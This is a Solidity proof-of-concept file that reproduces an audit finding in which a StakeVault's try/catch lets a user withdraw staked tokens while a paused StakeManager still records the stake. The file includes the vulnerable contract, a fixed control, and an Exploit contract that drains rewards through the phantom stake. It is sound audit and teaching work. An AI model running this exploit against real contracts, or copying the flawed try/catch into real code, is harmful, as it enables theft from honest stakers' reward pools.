// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of StatusL2 finding 65325:
// "Malicious actors can get free rewards if contract gets paused".
//
// StakeVault.leave() wraps stakeManager.leave() in a try/catch that was meant to
// tolerate a bad (reverting) StakeManager and avoid a DoS. But the catch branch
// STILL zeroes depositedBalance and transfers the vault's staked tokens back to
// the caller — even when stakeManager.leave() reverted and therefore the manager
// STILL counts the vault as staked. When an admin pauses the StakeManager
// (a normal operation), the attacker's leave() lands in the catch path: the
// staked tokens are returned to the attacker while the manager keeps a PHANTOM
// stake recorded. The attacker then farms StakeManager.redeemRewards() for free,
// draining the reward pool at honest stakers' expense.
//
// The `leave()` body below is the VERBATIM audited source (see finding 65325).
// The StakeManager reward accounting is the opaque external boundary that the
// finding does not embed, so it is a minimal faithful double — but the
// load-bearing state desync (tokens leave the vault while the manager's stake
// persists) is entirely driven by the verbatim leave().
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStakeManager {
    function stake(uint256 amount) external;
    function leave() external;
}

/// @dev Minimal ERC20 double for the opaque staking / reward tokens.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Faithful minimal double for the opaque StakeManager reward-accounting boundary.
// It records a per-vault stake, clears it on a *successful* leave(), reverts
// leave() while paused, and pays rewards proportional to the STILL-recorded stake.
// This is NOT the vulnerable contract — the vulnerable code is StakeVault.leave().
// ─────────────────────────────────────────────────────────────────────────────
contract StakeManager {
    IERC20 public stakingToken;
    IERC20 public rewardToken;
    address public admin;
    bool public paused;
    uint256 public constant REWARD_BP = 500; // 5% of recorded stake, per redeem

    mapping(address => uint256) public staked; // keyed by the calling vault

    error StakeManager__Paused();
    error StakeManager__NotAdmin();

    constructor(IERC20 _stakingToken, IERC20 _rewardToken, address _admin) {
        stakingToken = _stakingToken;
        rewardToken = _rewardToken;
        admin = _admin;
    }

    /// @dev A vault registers its stake; keyed by msg.sender (the vault).
    function stake(uint256 amount) external {
        staked[msg.sender] += amount;
    }

    /// @dev A vault unstakes. Reverts while paused — this is the revert that
    ///      StakeVault.leave()'s try/catch swallows.
    function leave() external {
        if (paused) revert StakeManager__Paused();
        staked[msg.sender] = 0;
    }

    function pause() external {
        if (msg.sender != admin) revert StakeManager__NotAdmin();
        paused = true;
    }

    /// @dev Pays rewards proportional to the stake the manager still records.
    function redeemRewards(address vault, address recipient) external returns (uint256) {
        uint256 reward = staked[vault] * REWARD_BP / 10000;
        rewardToken.transfer(recipient, reward);
        return reward;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. leave() is the VERBATIM audited StakeVault.leave().
// ─────────────────────────────────────────────────────────────────────────────
contract StakeVault {
    address public owner;
    IStakeManager public stakeManager;
    IERC20 public immutable STAKING_TOKEN;

    uint256 public depositedBalance;
    uint256 public lockUntil;
    bool public hasLeft;

    error StakeVault__FailedToLeave();
    error StakeVault__NotOwner();
    error StakeVault__InvalidDestination();

    modifier onlyOwner() {
        if (msg.sender != owner) revert StakeVault__NotOwner();
        _;
    }

    modifier validDestination(address _destination) {
        if (_destination == address(0)) revert StakeVault__InvalidDestination();
        _;
    }

    constructor(address _owner, IStakeManager _stakeManager, IERC20 _stakingToken) {
        owner = _owner;
        stakeManager = _stakeManager;
        STAKING_TOKEN = _stakingToken;
    }

    /// @dev Supporting scaffolding around the verbatim leave(): pull tokens into
    ///      the vault and register the stake with the manager.
    function stake(uint256 _amount, uint256 _secondsToLock) external onlyOwner {
        STAKING_TOKEN.transferFrom(msg.sender, address(this), _amount);
        depositedBalance += _amount;
        lockUntil = block.timestamp + _secondsToLock;
        stakeManager.stake(_amount);
    }

    // ── VERBATIM audited source (finding 65325) ──────────────────────────────
    function leave(address _destination) external onlyOwner validDestination(_destination) {
        hasLeft = true;
        try stakeManager.leave() {
            if (lockUntil <= block.timestamp) {
                depositedBalance = 0;
                bool success = STAKING_TOKEN.transfer(_destination, STAKING_TOKEN.balanceOf(address(this)));
                if (!success) {
                    revert StakeVault__FailedToLeave();
                }
            }
        } catch { // @> try/catch swallows StakeManager.leave() revert: vault returns staked tokens while the manager keeps counting the stake
            if (lockUntil <= block.timestamp) {
                depositedBalance = 0;
                bool success = STAKING_TOKEN.transfer(_destination, STAKING_TOKEN.balanceOf(address(this)));
                if (!success) {
                    revert StakeVault__FailedToLeave();
                }
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED variant (negative control): the recommended mitigation removes the
// try/catch, so a paused-manager revert propagates and leave() reverts as a
// whole — no tokens returned, no desync, no phantom stake to farm.
// ─────────────────────────────────────────────────────────────────────────────
contract StakeVaultFixed {
    address public owner;
    IStakeManager public stakeManager;
    IERC20 public immutable STAKING_TOKEN;

    uint256 public depositedBalance;
    uint256 public lockUntil;
    bool public hasLeft;

    error StakeVault__FailedToLeave();
    error StakeVault__NotOwner();
    error StakeVault__InvalidDestination();

    modifier onlyOwner() {
        if (msg.sender != owner) revert StakeVault__NotOwner();
        _;
    }

    modifier validDestination(address _destination) {
        if (_destination == address(0)) revert StakeVault__InvalidDestination();
        _;
    }

    constructor(address _owner, IStakeManager _stakeManager, IERC20 _stakingToken) {
        owner = _owner;
        stakeManager = _stakeManager;
        STAKING_TOKEN = _stakingToken;
    }

    function stake(uint256 _amount, uint256 _secondsToLock) external onlyOwner {
        STAKING_TOKEN.transferFrom(msg.sender, address(this), _amount);
        depositedBalance += _amount;
        lockUntil = block.timestamp + _secondsToLock;
        stakeManager.stake(_amount);
    }

    function leave(address _destination) external onlyOwner validDestination(_destination) {
        hasLeft = true;
        // FIX: no try/catch — a reverting stakeManager.leave() (e.g. paused)
        // propagates and reverts the whole call, so the manager's stake and the
        // vault's token custody can never desync.
        stakeManager.leave();
        if (lockUntil <= block.timestamp) {
            depositedBalance = 0;
            bool success = STAKING_TOKEN.transfer(_destination, STAKING_TOKEN.balanceOf(address(this)));
            if (!success) {
                revert StakeVault__FailedToLeave();
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: stake -> admin pauses -> leave() lands in the catch path,
// returning the staked tokens to the attacker while the manager keeps the
// phantom stake -> redeemRewards pays the attacker free rewards.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant STAKE_AMOUNT = 1000 ether;
    uint256 internal constant REWARD_POOL = 1000 ether;

    // Exposed results (read by the driver).
    address public vaultAddr;
    address public managerAddr;
    address public stakingTokenAddr;
    address public rewardTokenAddr;

    uint256 public attackerStakingRestored;
    uint256 public attackerRewardStolen;
    uint256 public phantomStakeRecorded;

    function run() external payable {
        // --- deploy, fixed order ---
        MiniToken staking = new MiniToken("Staking", "STK");                 // nonce 1
        MiniToken reward = new MiniToken("Reward", "STOLEN-REWARD");         // nonce 2
        StakeManager manager =
            new StakeManager(IERC20(address(staking)), IERC20(address(reward)), address(this)); // nonce 3
        StakeVault vault =
            new StakeVault(address(this), IStakeManager(address(manager)), IERC20(address(staking))); // nonce 4

        vaultAddr = address(vault);
        managerAddr = address(manager);
        stakingTokenAddr = address(staking);
        rewardTokenAddr = address(reward);

        // --- fund the manager's reward pool ---
        reward.mint(address(manager), REWARD_POOL);

        // --- attacker (this contract owns the vault) funds & approves the vault ---
        staking.mint(address(this), STAKE_AMOUNT);
        staking.approve(address(vault), STAKE_AMOUNT);

        // 1) stake with 0 lock so lockUntil <= block.timestamp (finding step 2)
        vault.stake(STAKE_AMOUNT, 0);

        // 2) admin pauses the StakeManager — a normal operation (finding step 1/3)
        manager.pause();

        // 3) leave() hits the catch path: staked tokens returned to ATTACKER,
        //    depositedBalance = 0, but manager.staked[vault] persists (finding step 4)
        vault.leave(ATTACKER);

        // 4) farm free rewards on the phantom stake (finding step 5)
        manager.redeemRewards(address(vault), ATTACKER);

        attackerStakingRestored = staking.balanceOf(ATTACKER);
        attackerRewardStolen = reward.balanceOf(ATTACKER);
        phantomStakeRecorded = manager.staked(address(vault));

        // HARM: attacker's staked principal is fully restored AND they extracted
        // free reward tokens despite the vault holding no live stake.
        require(attackerStakingRestored == STAKE_AMOUNT, "staking not restored");
        require(attackerRewardStolen > 0, "no free rewards");
        require(phantomStakeRecorded == STAKE_AMOUNT, "manager should still record the stake (desync)");
    }
}
